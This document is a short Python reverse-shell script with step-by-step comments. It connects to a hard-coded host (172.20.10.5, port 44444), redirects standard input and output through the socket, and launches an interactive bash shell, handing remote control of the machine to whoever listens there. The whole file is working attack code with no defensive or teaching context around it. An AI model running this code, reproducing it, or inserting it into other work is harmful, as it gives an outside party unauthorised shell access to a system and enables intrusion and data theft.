import socket
import subprocess
import os

# Define the target IP address and port
target_ip = "172.20.10.5"
target_port = 44444

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the target IP address and port
s.connect((target_ip, target_port))

# Duplicate the socket file descriptors to stdin, stdout, and stderr
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Execute a shell (/bin/bash) with interactive mode (-i)
p = subprocess.call(["/bin/bash", "-i"])

